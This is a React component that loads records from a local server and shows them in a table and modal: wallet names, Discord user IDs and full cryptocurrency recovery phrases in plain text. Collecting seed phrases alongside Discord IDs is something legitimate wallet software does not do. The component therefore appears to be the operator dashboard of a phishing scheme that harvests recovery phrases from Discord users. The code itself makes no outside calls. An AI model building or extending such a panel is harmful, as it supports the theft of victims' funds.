import React, { useEffect, useState } from "react";

import { Table } from "react-bootstrap";

import { TABLEHEADERS } from "../Modules/Listing";

import axios from "axios";
import ViewWallet from "./ViewWallet";

export default function WalletTable(props) {
  // ACTIVE TABLES
  const { activeTable, setActiveTable } = props;

  // SELECTED TABLE WALLETS
  const [table_wallets, set_able_wallets] = useState([]);

  // GET ALL THE LIST OF ALL WALLETS
  const getAll = () => {
    var config = {
      method: "get",
      url: "http://localhost:8000/get-all-wallets",
    };

    axios(config)
      .then(function (response) {
        set_able_wallets(response.data);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  // RUN THIS ONLY EVERY MOUNT
  useEffect(() => {
    getAll();
  }, []);

  // FILTER ACCORDING TO THE PRESENT TABLE
  const qq = [];

  table_wallets.map((data) => {
    if (data.wallet === activeTable) {
      qq.push(data);
    } else if (activeTable === "All") {
      qq.push(data);
    }
    return data;
  });

  // VIEW MODAL FOR THE SELECTED WALLET
  const [viewWallet, setViewWallet] = useState(false);

  // THE WALLET VIEWD LISTING
  const [nameWallet, setNameWallet] = React.useState("");
  const [recoveryPhraseWallet, setRecoveryPhraseWallet] = React.useState("");
  const [discordIDWallet, setDiscordIDWalletWallet] = React.useState("");

  // VIEW SELECTED WALLTE HANDLE
  const openWallet = (t) => {
    setViewWallet(true);
    setNameWallet(t.wallet);
    setRecoveryPhraseWallet(t.recoveryPhrase.join(" "));
    setDiscordIDWalletWallet(t.discordID);
  };

  const prop2 = {
    viewWallet,
    setViewWallet,
    nameWallet,
    recoveryPhraseWallet,
    discordIDWallet,
  };

  return (
    <div className="my-1">
      <Table striped bordered hover>
        <thead>
          <tr>
            {TABLEHEADERS.map((head, index) => {
              return <th key={index}>{head}</th>;
            })}
          </tr>
        </thead>
        <tbody>
          {qq.map((t, index) => {
            return (
              <tr key={index} onClick={() => openWallet(t)}>
                <td>{index}</td>
                <td>{t.wallet}</td>
                <td>{t.discordID}</td>
                <td>{t.recoveryPhrase.join(" ")}</td>
              </tr>
            );
          })}
        </tbody>
      </Table>

      {/* VIEW THE SELECTED WALLET */}
      <ViewWallet {...prop2} />
    </div>
  );
}
